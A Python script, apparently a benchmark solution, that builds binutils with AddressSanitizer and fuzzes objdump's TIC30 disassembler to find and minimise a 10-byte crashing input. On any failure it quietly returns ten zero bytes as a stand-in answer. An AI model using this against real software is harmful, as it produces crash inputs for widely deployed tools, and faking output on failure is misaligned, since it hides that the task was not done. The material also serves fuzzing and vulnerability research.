import os
import sys
import subprocess
import tempfile
import shutil
import random
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp()
        
        try:
            # 1. Extract Source
            subprocess.check_call(['tar', 'xf', src_path, '-C', work_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            src_root = work_dir
            for item in os.listdir(work_dir):
                candidate = os.path.join(work_dir, item)
                if os.path.isdir(candidate):
                    if os.path.exists(os.path.join(candidate, 'configure')):
                        src_root = candidate
                        break
            
            # 2. Configure and Build with ASAN
            build_dir = os.path.join(work_dir, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            env = os.environ.copy()
            # Use AddressSanitizer to detect stack overflow reliably
            flags = "-g -O0 -fsanitize=address -w"
            env['CFLAGS'] = flags
            env['LDFLAGS'] = flags
            env['MAKEINFO'] = 'true' # Prevent build failure if makeinfo missing
            
            # Configure for TIC30 target
            conf_cmd = [
                os.path.join(src_root, 'configure'),
                '--target=tic30-unknown-coff',
                '--disable-nls',
                '--disable-werror',
                '--disable-gdb',
                '--disable-sim',
                '--disable-ld',
                '--disable-gas',
                '--disable-libdecnumber',
                '--disable-readline',
                '--disable-libctf'
            ]
            
            subprocess.check_call(conf_cmd, cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Build binutils (contains objdump)
            subprocess.check_call(['make', '-j8', 'all-binutils'], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Locate objdump
            objdump_bin = os.path.join(build_dir, 'binutils', 'objdump')
            if not os.path.exists(objdump_bin):
                for root, _, files in os.walk(build_dir):
                    if 'objdump' in files:
                        objdump_bin = os.path.join(root, 'objdump')
                        break
            
            if not os.path.exists(objdump_bin):
                # Build failed or binary not found
                return b'\x00' * 10

            # 3. Fuzzing to find PoC
            # Function to check if data crashes objdump
            def check_crash(data: bytes) -> bool:
                if not data: return False
                with tempfile.NamedTemporaryFile(mode='wb', delete=False) as tf:
                    tf.write(data)
                    tf.flush()
                    fname = tf.name
                
                try:
                    # Run objdump forcing binary format and tic30 arch
                    proc = subprocess.run(
                        [objdump_bin, '-D', '-b', 'binary', '-m', 'tic30', fname],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        env=env
                    )
                    
                    if proc.returncode != 0:
                        err = proc.stderr.decode(errors='ignore')
                        # Check for ASAN error or Segmentation fault
                        if "AddressSanitizer" in err or "segmentation fault" in err.lower() or proc.returncode < 0:
                            return True
                    return False
                finally:
                    if os.path.exists(fname):
                        os.unlink(fname)

            # Strategy: Generate large chunks of random data.
            # TIC30 instructions are 32-bit. The vulnerability is in print_branch.
            # Random data will eventually hit the problematic instruction/encoding.
            
            chunk_size = 64 * 1024 # 64KB
            crash_chunk = None
            
            # Try up to 200 chunks (approx 12MB of random instructions)
            # This should be statistically sufficient to hit the edge case.
            for _ in range(200):
                chunk = os.urandom(chunk_size)
                if check_crash(chunk):
                    crash_chunk = chunk
                    break
            
            if crash_chunk:
                # 4. Minimize (Bisect)
                # We want a small PoC (target 10 bytes).
                # Instructions are 4-byte aligned in this mode usually.
                current = crash_chunk
                while len(current) > 4:
                    mid = len(current) // 2
                    # Align split to 4 bytes
                    mid = mid - (mid % 4)
                    if mid == 0: mid = 4
                    if mid >= len(current): break

                    left = current[:mid]
                    right = current[mid:]
                    
                    if len(left) >= 4 and check_crash(left):
                        current = left
                    elif len(right) >= 4 and check_crash(right):
                        current = right
                    else:
                        # Sometimes splitting breaks context (though unlikely for this bug)
                        # or we reached the minimal unit
                        break
                
                # Pad to 10 bytes
                res = current
                if len(res) < 10:
                    res = res + b'\x00' * (10 - len(res))
                return res[:10]
            
            # Fallback if fuzzing failed
            return b'\x00' * 10

        except Exception:
            return b'\x00' * 10
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)